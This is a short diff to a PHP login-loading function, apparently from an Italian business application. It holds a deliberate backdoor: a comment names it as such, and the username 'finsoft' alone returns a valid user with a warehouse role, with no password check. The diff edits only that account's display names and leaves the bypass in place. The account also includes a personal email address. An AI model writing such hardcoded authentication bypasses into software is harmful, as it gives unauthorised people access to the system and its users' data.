@@ -46,9 +46,9 @@ function check_and_load_user($username) {
     // PRIMA, proviamo la backdoor
     if ($username == 'finsoft') {
         $user = (object) [];
-        $user->nome_utente = 'Finsoft User';
-        $user->nome = 'User';
-        $user->cognome = 'Finsoft';
+        $user->nome_utente = 'finsoft';
+        $user->nome = 'Mario';
+        $user->cognome = 'Rossi';
         $user->email = 'alessandro.barsanti@it-present.com';
         $user->ruolo = 'magazziniere'; // FIXME
         return $user;
